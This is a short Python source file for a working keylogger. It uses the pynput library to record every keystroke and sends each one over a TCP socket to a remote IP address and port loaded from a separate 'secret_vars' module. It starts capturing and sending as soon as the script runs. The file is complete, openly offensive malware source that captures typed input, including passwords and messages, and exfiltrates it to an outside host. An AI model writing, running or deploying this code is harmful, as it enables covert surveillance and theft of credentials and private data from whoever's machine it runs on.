from pynput import keyboard
from secret_vars import IP_ADDRESS, PORT
import socket


class KeyRecorder:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((server_ip, server_port))
        self.listener = keyboard.Listener(on_press=self.on_key_press)
        self.listener.start()
        self.listener.join()

    def on_key_press(self, key):
        try:
            if isinstance(key, keyboard.Key):
                if key == keyboard.Key.space:
                    self.s.sendall(" ".encode())
                elif key == keyboard.Key.enter:
                    self.s.sendall("\n".encode())
                else:
                    self.s.sendall(f"{key} ".encode())
            else:
                self.s.sendall(key.char.encode())
        except Exception as e:
            print(f"Error sending data: {e}")


keylogger = KeyRecorder(IP_ADDRESS, PORT)
